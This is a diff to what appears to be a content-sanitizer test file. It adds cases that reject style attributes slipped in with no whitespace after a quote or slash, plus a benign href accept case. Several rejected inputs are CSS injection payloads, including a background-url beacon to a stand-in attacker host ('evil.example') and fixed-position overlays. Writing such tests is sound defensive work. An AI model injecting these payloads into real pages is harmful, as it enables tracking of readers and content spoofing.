@@ -379,11 +379,25 @@ rejects('Intro.\n\n<  div   slot="sidebar">', 'spaced slot attribute');
 rejects('Intro.\n\n<div style="background:url(//evil.example/?leak)">x</div>', 'plain style attribute');
 rejects('Intro.\n\n<  p   style = "position:fixed">x</p>', 'spaced style attribute');
 rejects('A link <a href="/wiki/stake/" style="color:red">stake</a> here.', 'style attribute on anchor');
+// Quote-abutted / slash-abutted forms: `<img src="x"style=…>` and `<img src=x/style=…>`
+// slipped the whitespace-delimited `\sstyle=` scan because there is no whitespace
+// before `style`. Same quote-abutted pattern the merged contenteditable/tabindex/draggable
+// and presentational-layout blocks (#496) use. style is the worst allowed attribute to
+// miss because it carries every CSS primitive the merged `\sstyle=` comment lists
+// (background beacons, fixed-position overlays, content spoofing).
+rejects('Intro.\n\n<img src="x"style="color:red">', 'quote-abutted style attribute (double quote)');
+rejects("Intro.\n\n<img src='x'style='color:red'>", 'quote-abutted style attribute (single quote)');
+rejects('A link <a href="/wiki/stake/"style="background:url(//evil.example/?leak)">x</a>', 'quote-abutted style on anchor');
+rejects('Intro.\n\n<img src=x/style="position:fixed">', 'slash-abutted style attribute');
 
 // Prose that merely mentions the word "style" without an attribute assignment
 // (including the "lifestyle" substring) must still pass.
 accepts('The visual style of the site is defined in a separate stylesheet.', 'benign style prose');
 accepts('A lifestyle choice is unrelated to CSS and must not be flagged.', 'benign lifestyle substring');
+// A benign href containing the literal substring `style=` (e.g. a slug or query
+// string) must not trip the quote-abutted scan after the URL text is emptied,
+// the same benign-href accept case the merged ping block (#495) added.
+accepts('See <a href="/wiki/stake?style=compact">stake docs</a> for details.', 'benign style= inside quoted href');
 
 // bgcolor= is the obsolete presentational sibling of style=: it paints an arbitrary
 // background colour (a fake red "alert" box) without an attribute the style= rule
